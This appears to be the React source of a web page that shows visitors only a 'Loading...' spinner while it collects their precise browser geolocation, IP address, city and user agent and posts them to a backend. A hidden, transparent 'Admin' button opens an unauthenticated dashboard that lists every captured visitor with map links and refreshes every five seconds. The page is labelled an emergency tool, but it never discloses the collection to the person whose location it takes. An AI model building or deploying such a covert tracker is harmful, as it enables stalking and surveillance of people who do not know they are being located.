import { useState, useEffect } from 'react'
import { Clock, Eye } from 'lucide-react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import './App.css'

interface LocationData {
  latitude: number
  longitude: number
  accuracy: number
  timestamp: number
}

interface IPData {
  ip: string
  city?: string
  region?: string
  country?: string
  timezone?: string
}

interface LocationRecord {
  id: string
  latitude: number
  longitude: number
  accuracy: number
  ip_address?: string
  city?: string
  region?: string
  country?: string
  timestamp: string
}

const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:8000'

function App() {
  const [location, setLocation] = useState<LocationData | null>(null)
  const [ipData, setIpData] = useState<IPData | null>(null)
  const [status, setStatus] = useState<'loading' | 'success' | 'error'>('loading')
  const [error, setError] = useState<string | null>(null)
  const [isAdmin, setIsAdmin] = useState(false)
  const [allLocations, setAllLocations] = useState<LocationRecord[]>([])

  const getIPInfo = async () => {
    try {
      const response = await fetch('https://ipapi.co/json/')
      const data = await response.json()
      setIpData(data)
      return data
    } catch (err) {
      console.error('Failed to get IP info:', err)
      try {
        const response = await fetch('https://api.ipify.org?format=json')
        const data = await response.json()
        const basicData = { ip: data.ip }
        setIpData(basicData)
        return basicData
      } catch (fallbackErr) {
        console.error('Failed to get IP:', fallbackErr)
        return null
      }
    }
  }

  const sendLocationToServer = async (locationData: LocationData, ipInfo: IPData | null) => {
    try {
      const payload = {
        latitude: locationData.latitude,
        longitude: locationData.longitude,
        accuracy: locationData.accuracy,
        ip_address: ipInfo?.ip,
        user_agent: navigator.userAgent,
        city: ipInfo?.city,
        region: ipInfo?.region,
        country: ipInfo?.country
      }

      const response = await fetch(`${API_BASE_URL}/api/location`, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload)
      })

      if (!response.ok) {
        throw new Error(`Server error: ${response.status}`)
      }

      const result = await response.json()
      console.log('Location sent successfully:', result)
      return result
    } catch (err) {
      console.error('Failed to send location to server:', err)
      throw err
    }
  }

  const captureLocation = async () => {
    if (!navigator.geolocation) {
      setError('Geolocation is not supported by this browser.')
      setStatus('error')
      return
    }

    const ipInfo = await getIPInfo()

    const options = {
      enableHighAccuracy: true,
      timeout: 15000,
      maximumAge: 0
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const locationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracy: position.coords.accuracy,
          timestamp: position.timestamp
        }
        
        setLocation(locationData)
        
        try {
          await sendLocationToServer(locationData, ipInfo)
          setStatus('success')
        } catch (err) {
          setError('Location captured but failed to send to server')
          setStatus('error')
        }
      },
      (error) => {
        let errorMessage = 'An unknown error occurred.'
        switch (error.code) {
          case error.PERMISSION_DENIED:
            errorMessage = 'Location access denied. Please allow location access and refresh the page.'
            break
          case error.POSITION_UNAVAILABLE:
            errorMessage = 'Location information is unavailable.'
            break
          case error.TIMEOUT:
            errorMessage = 'Location request timed out.'
            break
        }
        setError(errorMessage)
        setStatus('error')
      },
      options
    )
  }

  const fetchAllLocations = async () => {
    try {
      const response = await fetch(`${API_BASE_URL}/api/locations`)
      const data = await response.json()
      setAllLocations(data.locations || [])
    } catch (err) {
      console.error('Failed to fetch locations:', err)
    }
  }

  const clearAllLocations = async () => {
    try {
      await fetch(`${API_BASE_URL}/api/locations`, { method: 'DELETE' })
      setAllLocations([])
    } catch (err) {
      console.error('Failed to clear locations:', err)
    }
  }

  useEffect(() => {
    captureLocation()
  }, [])

  useEffect(() => {
    if (isAdmin) {
      fetchAllLocations()
      const interval = setInterval(fetchAllLocations, 5000)
      return () => clearInterval(interval)
    }
  }, [isAdmin])

  const toggleAdminView = () => {
    setIsAdmin(!isAdmin)
  }

  if (isAdmin) {
    return (
      <div className="min-h-screen bg-gray-50 p-4">
        <div className="max-w-6xl mx-auto">
          <div className="flex justify-between items-center mb-6">
            <h1 className="text-3xl font-bold text-gray-900">Emergency Location Dashboard</h1>
            <div className="flex gap-2">
              <Button onClick={clearAllLocations} variant="destructive">
                Clear All
              </Button>
              <Button onClick={toggleAdminView} variant="outline">
                Exit Admin
              </Button>
            </div>
          </div>

          <div className="grid gap-4">
            <Card>
              <CardHeader>
                <CardTitle>Total Locations Captured: {allLocations.length}</CardTitle>
                <CardDescription>Real-time location tracking dashboard</CardDescription>
              </CardHeader>
            </Card>

            {allLocations.map((loc) => (
              <Card key={loc.id}>
                <CardContent className="pt-6">
                  <div className="grid md:grid-cols-2 gap-4">
                    <div>
                      <h3 className="font-semibold mb-2">Location Details</h3>
                      <p><strong>Coordinates:</strong> {loc.latitude.toFixed(6)}, {loc.longitude.toFixed(6)}</p>
                      <p><strong>Accuracy:</strong> {Math.round(loc.accuracy)} meters</p>
                      <p><strong>Timestamp:</strong> {new Date(loc.timestamp).toLocaleString()}</p>
                      <a 
                        href={`https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`}
                        target="_blank"
                        rel="noopener noreferrer"
                        className="text-blue-600 hover:text-blue-800 underline"
                      >
                        View on Google Maps
                      </a>
                    </div>
                    <div>
                      <h3 className="font-semibold mb-2">Network Info</h3>
                      <p><strong>IP:</strong> {loc.ip_address}</p>
                      {loc.city && <p><strong>City:</strong> {loc.city}</p>}
                      {loc.region && <p><strong>Region:</strong> {loc.region}</p>}
                      {loc.country && <p><strong>Country:</strong> {loc.country}</p>}
                    </div>
                  </div>
                </CardContent>
              </Card>
            ))}
          </div>
        </div>
      </div>
    )
  }

  console.log('Status:', status, 'Location:', location, 'IP:', ipData, 'Error:', error)

  return (
    <div className="min-h-screen bg-white flex items-center justify-center">
      <div className="text-center">
        <div className="inline-block">
          <Clock className="h-12 w-12 text-gray-400 animate-spin mx-auto mb-4" />
        </div>
        <p className="text-xl text-gray-600">Loading...</p>
        
        <div className="mt-8 opacity-0">
          <Button onClick={toggleAdminView} variant="ghost" size="sm">
            <Eye className="h-4 w-4 mr-2" />
            Admin
          </Button>
        </div>
      </div>
    </div>
  )
}

export default App
